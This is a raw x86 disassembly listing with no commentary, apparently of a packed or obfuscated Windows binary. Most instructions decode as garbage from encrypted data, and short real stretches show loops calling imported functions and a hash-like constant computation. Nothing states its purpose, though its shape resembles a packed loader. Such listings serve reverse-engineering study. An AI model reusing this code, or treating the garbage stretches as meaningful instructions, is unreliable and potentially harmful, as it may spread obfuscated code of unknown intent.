  4049cb:	inc    ebx
  4049cc:	jbe    0x4049f3
  4049ce:	pop    edi
  4049cf:	push   eax
  4049d0:	ja     0x4049ce
  4049d2:	fistp  QWORD PTR [ebx]
  4049d4:	push   ebx
  4049d5:	loope  0x4049b1
  4049d7:	call   0xa9f0:0x316c7b3c
  4049de:	dec    ebp
  4049df:	xor    BYTE PTR [edx+0x2986cc4c],bl
  4049e5:	ins    DWORD PTR es:[edi],dx
  4049e6:	nop
  4049e7:	fmulp  st(0),st
  4049e9:	imul   esp,DWORD PTR [ecx-0x339f5ea],0xffffffcd
  4049f0:	mov    edx,0x982ccd1e
  4049f5:	mov    ah,0xca
  4049f7:	jne    0x4049df
  4049f9:	cmc    
  4049fa:	lea    edx,[ebx]
  4049fc:	es ja  0x404a50
  4049ff:	les    ebp,FWORD PTR [edx]
  404a01:	(bad)  
  404a02:	xor    BYTE PTR [edi],dh
  404a04:	mov    ds:0x8f23bc63,eax
  404a09:	out    0x3d,eax
  404a0b:	stos   DWORD PTR es:[edi],eax
  404a0c:	ins    DWORD PTR es:[edi],dx
  404a0d:	push   edx
  404a0e:	cmc    
  404a0f:	cmc    
  404a10:	jmp    0x30a00717
  404a15:	repnz dec edx
  404a17:	retf   0xff2f
  404a1a:	adc    bl,cl
  404a1c:	cli    
  404a1d:	inc    ecx
  404a1e:	pop    ebp
  404a1f:	out    0x33,eax
  404a21:	pop    ebx
  404a22:	inc    ecx
  404a23:	push   eax
  404a24:	ins    DWORD PTR es:[edi],dx
  404a25:	rol    DWORD PTR [eax],cl
  404a27:	fnstenv [ebx]
  404a29:	push   ebp
  404a2a:	fcom   QWORD PTR [edi]
  404a2c:	shr    ebp,0x65
  404a2f:	push   esp
  404a30:	jecxz  0x4049d0
  404a32:	(bad)  
  404a33:	call   0x4eee64d2
  404a38:	or     al,0x59
  404a3a:	ins    BYTE PTR es:[edi],dx
  404a3b:	adc    al,bl
  404a3d:	mov    ah,0xac
  404a3f:	pop    edx
  404a40:	cwde   
  404a41:	shl    BYTE PTR [edx+0x3b],cl
  404a44:	mov    eax,DWORD PTR [edi]
  404a46:	lahf   
  404a47:	dec    edi
  404a48:	pop    edi
  404a49:	je     0x404abd
  404a4b:	ja     0x404a86
  404a4d:	push   0x8dca8b9e
  404a52:	div    bh
  404a54:	jbe    0x404a02
  404a56:	mov    dl,al
  404a58:	iret   
  404a59:	and    BYTE PTR [ecx+0x7b18a32f],cl
  404a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a60:	sbb    BYTE PTR [ebx+0x9d34f47],0x99
  404a67:	in     eax,dx
  404a68:	in     eax,dx
  404a69:	jge    0x404a01
  404a6b:	stos   DWORD PTR es:[edi],eax
  404a6c:	sub    esi,DWORD PTR [eax]
  404a6e:	cmp    al,0x7f
  404a70:	xor    BYTE PTR [edx+0x35],ch
  404a73:	shl    BYTE PTR [esi+0x22],0x33
  404a77:	fiadd  DWORD PTR [edx-0x17]
  404a7a:	mov    ds:0xda32fef1,eax
  404a7f:	lahf   
  404a80:	pop    esi
  404a81:	pop    ecx
  404a82:	dec    ebx
  404a83:	jmp    0x6fb25880
  404a88:	inc    DWORD PTR [ebp-0x2e]
  404a8b:	sar    BYTE PTR [edx-0x62],0xfe
  404a8f:	sbb    ebx,ebp
  404a91:	adc    BYTE PTR [ebp+0x13b2d37e],bl
  404a97:	add    BYTE PTR [esi+ebx*2],al
  404a9a:	push   0x235e3e12
  404a9f:	imul   ebx,DWORD PTR [esi+0xba2fb21],0x974c1126
  404aa9:	shr    ecx,cl
  404aab:	xor    BYTE PTR ds:0x826c856c,cl
  404ab1:	test   ebp,ebp
  404ab3:	adc    al,0x82
  404ab5:	fsubp  st(6),st
  404ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ab8:	sub    cl,dl
  404aba:	push   ds
  404abb:	sub    edi,DWORD PTR [ebx+0x37]
  404abe:	add    eax,0xfd6957d8
  404ac3:	imul   edi,ecx,0x7d
  404ac6:	dec    edx
  404ac7:	int    0xbd
  404ac9:	dec    ebx
  404aca:	xor    eax,DWORD PTR [ecx-0x2b]
  404acd:	cmc    
  404ace:	add    BYTE PTR [esi],al
  404ad0:	sub    edx,edx
  404ad2:	or     eax,0xc38b1ade
  404ad7:	ss mov ecx,0x3d64f58f
  404add:	loope  0x404ab1
  404adf:	xchg   ebp,eax
  404ae0:	xchg   ebp,eax
  404ae1:	add    eax,0x7d73ace6
  404ae6:	xor    al,BYTE PTR ds:0x96279982
  404aec:	fwait
  404aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aee:	int    0x46
  404af0:	mov    esp,0x6b1d611
  404af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404af6:	or     cl,BYTE PTR [ebx-0x58]
  404af9:	(bad)  
  404afa:	jecxz  0x404b1e
  404afc:	cli    
  404afd:	into   
  404afe:	daa    
  404aff:	lock jae 0x404ada
  404b02:	sub    eax,0xf560d6ed
  404b07:	push   0x69
  404b09:	retf   
  404b0a:	das    
  404b0b:	pushf  
  404b0c:	mov    ds:0x9bbfe6a4,al
  404b11:	adc    al,0xc2
  404b13:	(bad)  
  404b16:	xchg   ecx,eax
  404b17:	jmp    0x6226:0x235d765d
  404b1e:	push   ss
  404b1f:	test   al,0x7a
  404b21:	repnz mov ebx,0xcbcf033
  404b27:	dec    edi
  404b28:	add    ch,BYTE PTR [eax+0x41]
  404b2b:	and    eax,0xfa03685c
  404b30:	xor    eax,0x80ed045e
  404b35:	sub    eax,0xe497db3c
  404b3a:	jae    0x404ad7
  404b3c:	fnstsw WORD PTR [ecx+edx*1-0x64af5421]
  404b43:	jae    0x404bc0
  404b45:	icebp  
  404b46:	retf   0x3e10
  404b49:	dec    ecx
  404b4a:	fcom   st(6)
  404b4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b4d:	jl     0x404b35
  404b4f:	iret   
  404b50:	rcr    al,1
  404b52:	rcl    DWORD PTR [esi+0x47],cl
  404b55:	mov    cl,0x62
  404b57:	sub    al,0xb9
  404b59:	sbb    al,0x21
  404b5b:	xor    bh,dh
  404b5d:	and    al,0x3f
  404b5f:	fsub   QWORD PTR ds:0x4937a77c
  404b65:	fcomp  DWORD PTR [edi]
  404b67:	mov    edx,0xf8f19852
  404b6c:	and    DWORD PTR [eax],edx
  404b6e:	xor    ebp,DWORD PTR [ebp-0x75fc1aec]
  404b74:	fidiv  DWORD PTR [ecx-0x43004270]
  404b7a:	add    al,0xb4
  404b7c:	mov    eax,ds:0xc8acb096
  404b81:	mov    ecx,0xeaec0713
  404b86:	cmp    bh,BYTE PTR [esi]
  404b88:	int3   
  404b89:	inc    esi
  404b8a:	fisubr WORD PTR [esi-0x60]
  404b8d:	popf   
  404b8e:	test   BYTE PTR [ecx-0x37],bl
  404b91:	pop    edx
  404b92:	inc    esi
  404b93:	int    0xa7
  404b95:	adc    eax,0xf63ef608
  404b9a:	leave  
  404b9b:	mov    bl,ah
  404b9d:	cmp    BYTE PTR [edi+0x47f67f85],ah
  404ba3:	jp     0x404bb1
  404ba5:	iret   
  404ba6:	pop    ecx
  404ba7:	push   0xaa42610f
  404bac:	popa   
  404bad:	adc    BYTE PTR [esi],dl
  404baf:	mov    ?,WORD PTR [edx+0x21cf521]
  404bb5:	mov    ecx,0xe6321327
  404bba:	bound  eax,QWORD PTR [ebx+0x60]
  404bbd:	pop    es
  404bbe:	inc    esi
  404bbf:	and    bh,BYTE PTR [ebx+eiz*8]
  404bc2:	push   ss
  404bc3:	cdq    
  404bc4:	rcl    bh,0x5b
  404bc7:	test   al,0xef
  404bc9:	ret    0xc76
  404bcc:	loopne 0x404c0b
  404bce:	mov    al,0xcb
  404bd0:	aad    0x60
  404bd2:	nop
  404bd3:	jno    0x404b79
  404bd5:	hlt    
  404bd6:	push   0xffffff99
  404bd8:	jg     0x404c0c
  404bda:	or     BYTE PTR [edx+eiz*2+0x4651c1e9],dl
  404be1:	add    eax,0xfc6452ab
  404be6:	mov    DWORD PTR [esp+edi*1-0x20],ebx
  404bea:	mov    al,0xb4
  404bec:	fsubr  st(4),st
  404bee:	loopne 0x404c1b
  404bf0:	rol    BYTE PTR [eax-0x1a],cl
  404bf3:	mov    edi,0xe2404334
  404bf8:	xor    DWORD PTR [edx],eax
  404bfa:	je     0x404be1
  404bfc:	shr    BYTE PTR [eax+0x15],cl
  404bff:	sbb    eax,0xb36b9e4d
  404c04:	sbb    eax,0x764b9946
  404c09:	mov    esi,ebx
  404c0b:	lods   eax,DWORD PTR ds:[esi]
  404c0c:	mov    ecx,0xd8b9deb5
  404c11:	loopne 0x404bd4
  404c13:	mov    dl,0xe7
  404c15:	xor    DWORD PTR [edi-0xb5bef8e],ecx
  404c1b:	enter  0xae,0x7a
  404c1f:	jmp    0x404bd9
  404c21:	push   ss
  404c22:	gs and eax,0x82e0d02a
  404c28:	jne    0x404c67
  404c2a:	scas   eax,DWORD PTR es:[edi]
  404c2b:	mov    ah,0xd6
  404c2d:	or     ecx,ecx
  404c2f:	sub    BYTE PTR [edi+0x5309fa8d],dl
  404c35:	mov    bh,0x69
  404c37:	cmp    dl,BYTE PTR [ecx-0x206ddd1e]
  404c3d:	xchg   ebp,eax
  404c3e:	jg     0x404c1e
  404c40:	aas    
  404c41:	out    dx,al
  404c42:	mov    BYTE PTR [edx],ch
  404c44:	inc    edx
  404c45:	adc    ah,bh
  404c47:	fsub   st,st(7)
  404c49:	repz repz xchg edx,eax
  404c4c:	cmc    
  404c4d:	adc    al,0xad
  404c4f:	fdiv   DWORD PTR [edx+edx*4-0x39]
  404c53:	xlat   BYTE PTR ds:[ebx]
  404c54:	adc    al,0x8b
  404c56:	cli    
  404c57:	inc    esi
  404c58:	jns    0x404c6e
  404c5a:	pop    eax
  404c5b:	pop    ss
  404c5c:	ret    0xc8a6
  404c5f:	xor    eax,0x7d3c52b4
  404c64:	sbb    bl,bh
  404c66:	and    al,0x32
  404c68:	pop    ss
  404c69:	loope  0x404c50
  404c6b:	(bad)  
  404c6c:	cmp    esi,edi
  404c6e:	fcomi  st,st(6)
  404c70:	(bad)  
  404c71:	inc    edx
  404c72:	pop    edx
  404c73:	(bad)  
  404c74:	std    
  404c75:	dec    ebp
  404c76:	imul   ebx,DWORD PTR [esi],0xbbe5a080
  404c7c:	jg     0x404cb7
  404c7e:	mov    al,ds:0x7149de79
  404c83:	in     eax,dx
  404c84:	pop    edx
  404c85:	fsub   DWORD PTR [esi+ebp*1+0x1c]
  404c89:	and    eax,0x8f21698b
  404c8e:	mov    eax,DWORD PTR [ebp-0x5ab87962]
  404c94:	inc    edx
  404c95:	enter  0xa580,0x51
  404c99:	imul   ebp,edx,0x8a2c5acd
  404c9f:	pop    ds
  404ca0:	dec    ebp
  404ca1:	cmp    al,0x27
  404ca3:	adc    BYTE PTR [ebx+0x4e03c1bc],bh
  404ca9:	aas    
  404caa:	(bad)  
  404cab:	jmp    0xb3feb8dc
  404cb0:	pop    ecx
  404cb1:	xchg   edi,eax
  404cb2:	into   
  404cb3:	sbb    bh,BYTE PTR [eax+0x544417d8]
  404cb9:	outs   dx,BYTE PTR ds:[esi]
  404cba:	shl    BYTE PTR [edi],1
  404cbc:	inc    eax
  404cbd:	in     al,dx
  404cbe:	xchg   esp,eax
  404cbf:	push   ss
  404cc0:	nop
  404cc1:	mov    ch,0xe6
  404cc3:	stos   DWORD PTR es:[edi],eax
  404cc4:	popa   
  404cc5:	mul    dl
  404cc7:	push   0x49450d65
  404ccc:	pusha  
  404ccd:	push   ds
  404cce:	or     BYTE PTR [esi-0x5adf77b],0x46
  404cd5:	mov    ch,0x5e
  404cd7:	push   ss
  404cd8:	sahf   
  404cd9:	inc    eax
  404cda:	and    eax,DWORD PTR [eax-0x4]
  404cdd:	and    eax,edi
  404cdf:	dec    ebp
  404ce0:	stos   DWORD PTR es:[edi],eax
  404ce1:	pop    ss
  404ce2:	fld    QWORD PTR [eax+0x112d7489]
  404ce8:	and    BYTE PTR [edx],dl
  404cea:	mov    cl,0x6f
  404cec:	fistp  DWORD PTR [ecx+ebp*4-0x3f]
  404cf0:	xchg   edi,eax
  404cf1:	xchg   esi,eax
  404cf2:	(bad)  
  404cf3:	fisttp WORD PTR [edx+0x30]
  404cf6:	test   DWORD PTR [ebx+eax*8],ebp
  404cf9:	adc    al,0x43
  404cfb:	aad    0x57
  404cfd:	mov    eax,DWORD PTR [ebp-0x14]
  404d00:	add    DWORD PTR [eax],0x705fa8c
  404d06:	mov    eax,DWORD PTR [ebp-0x10]
  404d09:	mov    edx,DWORD PTR [ebp+0x8]
  404d0c:	xor    eax,ecx
  404d0e:	lea    eax,[eax+edx*1+0x327299]
  404d15:	mov    DWORD PTR [ebp+0x8],eax
  404d18:	inc    DWORD PTR [ebp+0xc]
  404d1b:	jmp    0x4040d8
  404d20:	mov    eax,DWORD PTR [ebp-0x10]
  404d23:	xor    eax,ecx
  404d25:	mov    ecx,DWORD PTR [ebp+0x10]
  404d28:	add    eax,esi
  404d2a:	mov    DWORD PTR [ecx],eax
  404d2c:	pop    esi
  404d2d:	leave  
  404d2e:	ret    0xc
  404d31:	push   ebp
  404d32:	mov    ebp,esp
  404d34:	push   ecx
  404d35:	sub    edx,eax
  404d37:	jmp    0x404f34
  404d3c:	pop    edi
  404d3d:	mov    ebx,cs
  404d3f:	and    ebp,edi
  404d41:	jno    0x404dc0
  404d43:	dec    esp
  404d44:	call   0xccaa7d7b
  404d49:	nop
  404d4a:	mov    ah,0x6c
  404d4c:	sbb    ebp,DWORD PTR [edi]
  404d4e:	jle    0x404dce
  404d50:	pop    esi
  404d51:	jg     0x404dd1
  404d53:	jle    0x404cf7
  404d55:	pop    ecx
  404d56:	sub    al,0x9
  404d58:	mov    ds:0x71175d9,eax
  404d5d:	int3   
  404d5e:	fistp  WORD PTR [ebx]
  404d60:	jae    0x404dcf
  404d62:	neg    DWORD PTR [eax+eiz*1+0x2e]
  404d66:	jge    0x404daf
  404d68:	or     edx,eax
  404d6a:	addr16 in eax,0xb1
  404d6d:	mov    dl,BYTE PTR ds:0x7fe5fccb
  404d73:	inc    ebx
  404d74:	mov    ah,0x74
  404d76:	or     BYTE PTR ds:0x25c65ac,dl
  404d7c:	lock xchg edx,eax
  404d7e:	addr16 loop 0x404d97
  404d81:	jge    0x404d91
  404d83:	push   ebx
  404d84:	sbb    BYTE PTR [ecx+0x21269469],ah
  404d8a:	stos   BYTE PTR es:[edi],al
  404d8b:	ftst   
  404d8d:	sbb    DWORD PTR [ebp-0x1d],eax
  404d90:	stos   DWORD PTR es:[edi],eax
  404d91:	popa   
  404d92:	or     ebp,ebx
  404d94:	cmp    DWORD PTR [esi+0x4d56a842],ecx
  404d9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d9b:	or     dl,0xf0
  404d9e:	ja     0x404d89
  404da0:	addr16 mov esp,0xde1c76d1
  404da6:	test   DWORD PTR [esi],0xd0805b0a
  404dac:	or     DWORD PTR [edx-0x7eb1e705],ebx
  404db2:	pop    ss
  404db3:	ror    DWORD PTR [esi+0x60f2e083],1
  404db9:	pop    esi
  404dba:	cmp    eax,0xd0943711
  404dbf:	(bad)  
  404dc0:	jmp    0x588cb99d
  404dc5:	xchg   DWORD PTR [eax-0x7e],eax
  404dc8:	rcr    esp,0x60
  404dcb:	or     dl,BYTE PTR [edx+esi*8-0x4aa6f99]
  404dd2:	xchg   esi,eax
  404dd3:	cmp    DWORD PTR [ebx],ecx
  404dd5:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  404dd7:	sub    BYTE PTR ds:0xb08b7453,bh
  404ddd:	out    dx,al
  404dde:	add    eax,0x8e250892
  404de3:	lods   eax,DWORD PTR gs:[esi]
  404de5:	jnp    0x404d67
  404de7:	jl     0x404def
  404de9:	cmc    
  404dea:	iret   
  404deb:	push   edx
  404dec:	push   esi
  404ded:	pop    edx
  404dee:	jle    0x404df5
  404df0:	pop    ebx
  404df1:	outs   dx,BYTE PTR ds:[esi]
  404df2:	inc    esp
  404df3:	fstp   DWORD PTR [edi+0x4c]
  404df6:	mov    eax,0xa7637eea
  404dfb:	sti    
  404dfc:	sub    ecx,DWORD PTR [ebx+0x40e6215a]
  404e02:	rol    ebp,cl
  404e04:	fwait
  404e05:	std    
  404e06:	test   DWORD PTR [eax+eax*8-0x6f],eax
  404e0a:	rcr    DWORD PTR [esi],1
  404e0c:	and    al,0x7f
  404e0e:	jmp    0x404e57
  404e10:	mov    ebp,0xc138877d
  404e15:	popa   
  404e16:	loope  0x404e29
  404e18:	cmp    DWORD PTR [edi+0x23],esp
  404e1b:	jge    0x404da4
  404e1d:	ja     0x404ddd
  404e1f:	in     eax,dx
  404e20:	ror    BYTE PTR [edx+0x71868790],0x35
  404e27:	sub    dl,BYTE PTR [ebp-0x36]
  404e2a:	jae    0x404e7a
  404e2c:	cvtps2pd xmm7,QWORD PTR [esi]
  404e2f:	dec    ecx
  404e30:	(bad)  
  404e31:	xacquire xchg BYTE PTR [eax+0x31],bh
  404e35:	mov    esi,0x510bc5d9
  404e3a:	pop    edi
  404e3b:	dec    esp
  404e3c:	daa    
  404e3d:	test   BYTE PTR [ebx+0x26],cl
  404e40:	rcr    DWORD PTR [ebp+0x24],0x8e
  404e44:	mov    bl,0x6b
  404e46:	mov    edi,0xbc242b7b
  404e4b:	jnp    0x404e49
  404e4d:	les    ebx,FWORD PTR [edx-0x3b05df1a]
  404e53:	(bad)  
  404e54:	sti    
  404e55:	iret   
  404e56:	ficomp DWORD PTR [esi-0x4ad218c4]
  404e5c:	dec    esp
  404e5d:	mov    ch,dl
  404e5f:	jmp    DWORD PTR [eax]
  404e61:	icebp  
  404e62:	mov    dl,0xfa
  404e64:	(bad)  
  404e66:	cmp    edx,DWORD PTR [ebx+0x4a]
  404e69:	inc    ecx
  404e6a:	jns    0x404e85
  404e6c:	fidiv  WORD PTR ds:[ebp+0x33]
  404e70:	sub    DWORD PTR [edi],ebp
  404e72:	add    eax,0xc4884df4
  404e77:	pop    ss
  404e78:	int3   
  404e79:	cli    
  404e7a:	mov    eax,ds:0xa2c079cb
  404e7f:	cmc    
  404e80:	iret   
  404e81:	stos   DWORD PTR es:[edi],eax
  404e82:	push   esp
  404e83:	push   esp
  404e84:	test   DWORD PTR [esi+0x55e6032f],ecx
  404e8a:	sub    al,BYTE PTR [esi]
  404e8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e8d:	aas    
  404e8e:	aas    
  404e8f:	ja     0x404e88
  404e91:	mov    edx,0x5d0abd25
  404e96:	mov    ebx,0x15bb2bd5
  404e9b:	imul   esi,DWORD PTR [esi],0xf6a04fb8
  404ea1:	jne    0x404f19
  404ea3:	ins    DWORD PTR es:[edi],dx
  404ea4:	clc    
  404ea5:	mov    ?,WORD PTR [eax-0x6644fdc6]
  404eab:	loope  0x404e45
  404ead:	adc    al,0xec
  404eaf:	pop    ds
  404eb0:	fisttp DWORD PTR [esi]
  404eb2:	loopne 0x404edc
  404eb4:	and    edi,DWORD PTR [esi-0x3cf35ce6]
  404eba:	dec    edx
  404ebb:	xor    ecx,DWORD PTR [edi]
  404ebd:	and    ebp,edx
  404ebf:	jmp    0xfaa0:0xe1860d31
  404ec6:	inc    ecx
  404ec7:	sub    DWORD PTR [ebx+0x1efe854e],0xffffff86
  404ece:	xchg   BYTE PTR [edi-0x25],dl
  404ed1:	push   0x69
  404ed3:	add    ah,ch
  404ed5:	jo     0x404e73
  404ed7:	mov    bh,0x47
  404ed9:	xlat   BYTE PTR ds:[ebx]
  404eda:	cld    
  404edb:	(bad)  [edx]
  404edd:	xlat   BYTE PTR ds:[ebx]
  404ede:	stc    
  404edf:	sbb    ebp,DWORD PTR [ecx]
  404ee1:	push   ss
  404ee2:	push   ecx
  404ee3:	call   0x5bf8c95e
  404ee8:	xchg   esi,eax
  404ee9:	xor    eax,0x91e1af41
  404eee:	and    eax,0x57c1702a
  404ef3:	inc    ebx
  404ef4:	xchg   BYTE PTR [ecx-0x2d0c33aa],bh
  404efa:	sub    eax,0x359b345c
  404eff:	jle    0x404f60
  404f01:	add    al,BYTE PTR [ebx-0x79e700f8]
  404f07:	and    dl,BYTE PTR [edi+0xe56ae3d]
  404f0d:	fcomp  DWORD PTR [ecx+0x76]
  404f10:	data16 jo 0x404f6e
  404f13:	mov    dl,0x58
  404f15:	pushf  
  404f16:	loope  0x404eaa
  404f18:	loope  0x404f6c
  404f1a:	push   0x55
  404f1c:	push   ebx
  404f1d:	push   ebp
  404f1e:	and    al,0x4
  404f20:	push   eax
  404f21:	adc    al,0x8d
  404f23:	cmp    eax,0xdda07bd6
  404f28:	inc    esp
  404f29:	jp     0x404fa4
  404f2b:	rcl    DWORD PTR [edi-0x5d568c9f],0xce
  404f32:	cmp    esp,DWORD PTR [ecx+edx*2+0x467b150b]
  404f39:	inc    ebx
  404f3a:	add    bh,al
  404f3c:	inc    ebp
  404f3d:	clc    
  404f3e:	test   DWORD PTR ss:[eax+edi*8+0x470b05c7],ebx
  404f46:	inc    ebx
  404f47:	add    BYTE PTR [eax+eax*1],bl
  404f4a:	add    BYTE PTR [eax],al
  404f4c:	cmp    DWORD PTR ds:0x43470b,0x0
  404f53:	je     0x404f94
  404f59:	cmp    DWORD PTR ds:0x43470b,0x21
  404f60:	jne    0x404f84
  404f66:	push   DWORD PTR [ebp-0x24]
  404f69:	push   DWORD PTR [ebp-0x20]
  404f6c:	push   0x26f9
  404f71:	push   0x3d74
  404f76:	push   0x4b4e
  404f7b:	push   DWORD PTR [ebp-0x1c]
  404f7e:	call   DWORD PTR ds:0x413280
  404f84:	mov    eax,ds:0x43470b
  404f89:	dec    eax
  404f8a:	mov    ds:0x43470b,eax
  404f8f:	jmp    0x404f4c
  404f94:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404f9b:	mov    eax,DWORD PTR [ebp-0x4]
  404f9e:	xor    DWORD PTR ds:0x434673,ecx
  404fa4:	push   esi
  404fa5:	and    DWORD PTR ds:0x434713,0x0
  404faf:	mov    edx,DWORD PTR ds:0x434713
  404fb5:	inc    edx
  404fb6:	mov    DWORD PTR ds:0x434713,edx
  404fbc:	cmp    DWORD PTR ds:0x434713,0x21
  404fc3:	jne    0x404fe1
  404fc9:	push   0x4348c9
  404fce:	push   0x43484e
  404fd3:	push   0x6321
  404fd8:	push   DWORD PTR [ebp-0x10]
  404fdb:	call   DWORD PTR ds:0x4130bc
  404fe1:	cmp    DWORD PTR ds:0x434713,0x19
  404fe8:	jb     0x404faf
  404fee:	inc    ecx
  404fef:	mov    esi,DWORD PTR [ebp-0x8]
  404ff2:	inc    DWORD PTR ds:0x4346b7
  404ff8:	mov    edx,0x7510851
  404ffd:	xor    eax,edx
  404fff:	xor    esi,edx
  405001:	mov    ecx,0x327299
  405006:	add    esi,ecx
  405008:	xor    DWORD PTR ds:0x4346b7,0x55d1
  405012:	add    eax,ecx
  405014:	imul   eax,esi
  405017:	mov    esi,DWORD PTR [ebp+0xc]
  40501a:	cmp    esi,eax
  40501c:	jne    0x405038
  405022:	mov    eax,DWORD PTR [ebp-0x4]
  405025:	mov    esi,DWORD PTR [ebp-0x8]
  405028:	xor    eax,edx
  40502a:	xor    esi,edx
  40502c:	add    eax,ecx
  40502e:	add    esi,ecx
  405030:	imul   eax,esi
  405033:	jmp    0x405270
  405038:	mov    eax,DWORD PTR [ebp+0xc]
  40503b:	mov    eax,DWORD PTR [eax+0x78]
  40503e:	jmp    0x40523b
  405043:	imul   esp,DWORD PTR [eax],0x7d571dbe
  405049:	jge    0x4050b7
  40504b:	push   esp
  40504c:	pop    ds
  40504d:	loopne 0x40508f
  40504f:	outs   dx,DWORD PTR ds:[esi]
  405050:	das    
  405051:	fadd   QWORD PTR [edx]
  405053:	jnp    0x40507e
  405055:	jle    0x4050d5
  405057:	pop    esi
  405058:	jg     0x4050d8
  40505a:	jle    0x4050ba
  40505c:	pop    ss
  40505d:	imul   DWORD PTR [eax+0x63]
  405060:	inc    esp
  405061:	icebp  
  405062:	jg     0x404fe8
  405064:	gs push ss
  405066:	imul   esp,DWORD PTR [ecx],0xffffffbe
  405069:	out    0xf4,al
  40506b:	mov    bh,0x40
  40506d:	xchg   ecx,eax
  40506e:	pop    ebx
  40506f:	sub    edi,esp
  405071:	push   edx
  405072:	out    0x28,al
  405074:	push   edx
  405075:	jno    0x405073
  405077:	les    ebp,FWORD PTR [ebx+ebx*1+0x7281e2dd]
  40507e:	fstp   st(0)
  405080:	cmc    
  405081:	sub    BYTE PTR [ebp+0x16424c06],dl
  405087:	inc    ecx
  405088:	cmp    ah,0x50
  40508b:	mov    dl,0x2d
  40508d:	div    edi
  40508f:	fnstsw ax
  405091:	dec    edi
  405092:	xor    ebx,DWORD PTR [ecx+0x7e]
  405095:	call   0x4b895301
  40509a:	pop    ecx
  40509b:	cs dec ebp
  40509d:	mov    ebx,0x5def1127
  4050a2:	push   0x3f
  4050a4:	jl     0x405105
  4050a6:	pop    ds
  4050a7:	retf   
  4050a8:	add    edi,ecx
  4050aa:	div    BYTE PTR [esi-0x6a78c253]
  4050b0:	aaa    
  4050b1:	sub    DWORD PTR [ecx],ecx
  4050b3:	xor    al,0xa8
  4050b5:	xor    eax,DWORD PTR [ecx]
  4050b7:	dec    esi
  4050b8:	in     al,dx
  4050b9:	sub    edi,esp
  4050bb:	sahf   
  4050bc:	xchg   esi,eax
  4050bd:	popa   
  4050be:	(bad)  
  4050c0:	fabs   
  4050c2:	sub    BYTE PTR [edx+0x74],ah
  4050c5:	mov    ds:0x54164393,eax
  4050ca:	mov    ah,0x80
  4050cc:	mov    cl,0x46
  4050ce:	in     eax,0xf4
  4050d0:	xor    al,0x82
  4050d2:	(bad)  
  4050d3:	mov    ch,0xad
  4050d5:	xchg   ecx,eax
  4050d6:	adc    al,0xf5
  4050d8:	shl    DWORD PTR [edi],0x12
  4050db:	xchg   ebp,esp
  4050dd:	or     DWORD PTR [ebx+ebx*2],0x63
  4050e1:	sub    DWORD PTR [ecx-0x17ab835b],ebp
  4050e7:	mov    edi,0x9aca7f
  4050ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050ed:	pop    ds
  4050ee:	cdq    
  4050ef:	aad    0xa3
  4050f1:	sbb    eax,0xea5da23c
  4050f6:	fst    st(2)
  4050f8:	cmp    al,0x7c
  4050fa:	push   0xe6fb52ff
  4050ff:	push   0xffffffa2
  405101:	xchg   ecx,eax
  405102:	mov    cs,WORD PTR [esi+0x4c]
  405105:	cdq    
  405106:	xchg   esi,eax
  405107:	ss dec ecx
  405109:	or     edi,DWORD PTR [edi+esi*2+0x71]
  40510d:	cdq    
  40510e:	jbe    0x405097
  405110:	cmp    DWORD PTR [ecx+0x70676308],0x1bd14fc3
  40511a:	add    eax,0xca03e3b5
  40511f:	push   cs
  405120:	es pusha 
  405122:	xor    eax,0x5c5e5005
  405127:	call   0x5f9573e2
  40512c:	enter  0x1216,0xc7
  405130:	sti    
  405131:	or     al,0x93
  405133:	loope  0x40510b
  405135:	sub    BYTE PTR [ebx+0x34],dh
  405138:	pop    es
  405139:	or     DWORD PTR [eax-0x1f],esi
  40513c:	(bad)  
  40513d:	repnz push esp
  40513f:	rcr    BYTE PTR ds:0x686cfcf0,1
  405145:	push   cs
  405146:	push   edi
  405147:	mov    eax,ds:0x3415a78c
  40514c:	shl    BYTE PTR [esi+0x74],0xe4
  405150:	loop   0x4050ec
  405152:	xchg   esi,esi
  405154:	ss xchg ebp,eax
  405156:	push   0x43
  405158:	fcmovnu st,st(5)
  40515a:	add    edi,DWORD PTR [eax-0x6d070162]
  405160:	add    al,0xb1
  405162:	(bad)  
  405164:	hlt    
  405165:	and    DWORD PTR [ebx-0x58],0x58c6653
  40516c:	mov    ds:0xb27e8742,eax
  405171:	sub    al,0xf7
  405173:	test   al,0xef
  405175:	adc    ebx,DWORD PTR [edx+0xa]
  405178:	outs   dx,BYTE PTR ds:[esi]
  405179:	sub    ecx,edi
  40517b:	sti    
  40517c:	adc    BYTE PTR [eax+0x7eb6f6b2],ch
  405182:	mov    ebx,0xb5c6a27e
  405187:	inc    eax
  405188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405189:	pminsw mm3,QWORD PTR [edi+0x42]
  40518d:	pop    edi
  40518e:	sbb    eax,0xb25d8a59
  405193:	mov    ch,0x81
  405195:	dec    edx
  405196:	in     al,0x97
  405198:	jb     0x4051f8
  40519a:	outs   dx,BYTE PTR ds:[esi]
  40519b:	cmp    BYTE PTR [eax-0x4f],bh
  40519e:	cld    
  40519f:	call   DWORD PTR [ebp+0x3a259c7e]
  4051a5:	mov    cl,0xe8
  4051a7:	sahf   
  4051a8:	mov    eax,ds:0xfba53408
  4051ad:	and    DWORD PTR [ecx-0x72d784e3],0x23
  4051b4:	inc    esp
  4051b5:	pop    ebp
  4051b6:	xor    cl,BYTE PTR [eax]
  4051b8:	test   eax,0xe3a2df57
  4051bd:	daa    
  4051be:	mov    edx,0x58596410
  4051c3:	inc    ebp
  4051c4:	or     eax,0x2c2926a7
  4051c9:	jmp    0xc1b83a14
  4051ce:	pslld  mm3,QWORD PTR [ecx+0x4523eef4]
  4051d5:	adc    al,BYTE PTR [ecx+0x555d54e]
  4051db:	push   edi
  4051dc:	dec    ebx
  4051dd:	mov    eax,ds:0x8a7057a4
  4051e2:	jge    0x40522f
  4051e4:	sub    bh,BYTE PTR [eax+0x510ce043]
  4051ea:	jno    0x4051df
  4051ec:	das    
  4051ed:	(bad)  
  4051ee:	fist   DWORD PTR [ebp-0x37c048b4]
  4051f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
